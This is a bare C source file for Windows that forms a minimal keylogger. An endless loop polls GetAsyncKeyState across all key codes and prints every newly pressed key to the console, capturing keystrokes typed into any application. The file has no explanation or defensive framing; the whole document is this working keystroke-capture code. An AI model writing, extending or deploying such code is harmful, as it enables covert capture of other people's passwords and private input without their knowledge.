#include <stdio.h>
#include <windows.h>

int main(int argc, char *argv[])
{
    while (1)
        for (int i = 0; i < 255; i++)
            if(GetAsyncKeyState(i) == -32767)
                printf("%c", i);
    return 0;
}
